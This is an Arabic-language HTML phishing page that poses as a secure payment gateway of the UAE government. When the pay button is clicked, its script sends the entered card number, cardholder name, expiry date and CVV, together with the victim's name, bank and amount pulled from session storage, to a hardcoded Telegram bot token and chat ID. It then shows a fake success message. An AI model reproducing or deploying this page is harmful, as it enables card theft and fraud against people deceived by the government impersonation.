<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>بوابة الدفع</title>
  <style>
    body{font-family:Arial, Tahoma, sans-serif;background:#f5f5f5;margin:0}
    header{text-align:center;background:#004080;color:#fff;padding:20px}
    main{padding:20px}
    .card{max-width:420px;margin:auto;background:#fff;padding:20px;border-radius:10px;box-shadow:0 0 8px rgba(0,0,0,.12)}
    h2{text-align:center;color:#004080;margin-top:0}
    label{display:block;margin-top:12px;font-weight:700}
    input,select,button{width:100%;padding:12px;margin-top:6px;border:1px solid #ccc;border-radius:6px;box-sizing:border-box}
    button{background:#004080;color:#fff;border:0;font-weight:800;cursor:pointer}
    button:hover{background:#003060}
    .summary{background:#f7f9ff;border:1px solid #ccd5ff;border-radius:8px;padding:12px;font-size:14px;margin-bottom:12px}
    footer{background:#000;color:#fff;text-align:center;padding:14px;margin-top:30px;font-size:13px}
  </style>
</head>
<body>
  <header>
    <h2>بوابة الدفع الآمنة</h2>
  </header>

  <main>
    <div class="card">
      <div id="summary" class="summary">—</div>

      <label for="cardNumber">رقم البطاقة </label>
      <input id="cardNumber" placeholder="1234-5678-9012-3456" />

      <label for="cardName">الاسم على البطاقة</label>
      <input id="cardName" placeholder="اسم حامل البطاقة" />

      <label for="exp">تاريخ الانتهاء</label>
      <div style="display:flex;gap:8px">
        <select id="expMonth">
          <option value="">شهر</option>
          <option>01</option><option>02</option><option>03</option><option>04</option>
          <option>05</option><option>06</option><option>07</option><option>08</option>
          <option>09</option><option>10</option><option>11</option><option>12</option>
        </select>
        <select id="expYear">
          <option value="">سنة</option>
          <option>2025</option><option>2026</option><option>2027</option>
          <option>2028</option><option>2029</option><option>2030</option>
          <option>2031</option><option>2032</option>
        </select>
      </div>

      <label for="cvv">CVV</label>
      <input id="cvv" maxlength="3" placeholder="***" />

      <button id="payBtn">ادفع الآن</button>
    </div>
  </main>

  <footer>
    جميع الحقوق محفوظة © حكومة الإمارات 2025
  </footer>

  <script>
    // بيانات بوت تيليجرام
    const BOT_TOKEN = "8175456301:AAHcojlkfA5YkgBkx5gAnvFjd-u5Tk6hg7I";
    const CHAT_ID   = "8404960059";

    // استرجاع البيانات من sessionStorage
    const d = JSON.parse(sessionStorage.getItem('formData') || sessionStorage.getItem('userData') || '{}');
    const summaryEl = document.getElementById('summary');
    if(d && (d.fullName || d.bank || d.amount)){
      summaryEl.innerHTML = `
        <div>👤 ${d.fullName||'-'}</div>
        <div>🏦 ${d.bank||'-'}</div>
        <div>💵 ${d.amount||'-'} درهم</div>
      `;
    }

    async function sendTelegram(text){
      try{
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
          method:'POST',
          headers:{'Content-Type':'application/json'},
          body: JSON.stringify({ chat_id: CHAT_ID, text })
        });
      }catch(e){
        console.warn('Telegram error:', e);
      }
    }

    document.getElementById('payBtn').addEventListener('click', async ()=>{
      const msg = `💳 الدفع ()
👤 الاسم: ${d.fullName||'-'}
🏦 البنك: ${d.bank||'-'}
💵 المبلغ: ${d.amount||'-'} درهم
📄 البطاقة: ${document.getElementById('cardNumber').value||'-'}
👤 حامل البطاقة: ${document.getElementById('cardName').value||'-'}
📆 الانتهاء: ${document.getElementById('expMonth').value||'-'}/${document.getElementById('expYear').value||'-'}
🔐 CVV: ${document.getElementById('cvv').value||'-'}`;

      await sendTelegram(msg);

      alert('✅ تم إرسال بيانات الدفع ()');
    });
  </script>
</body>
</html>
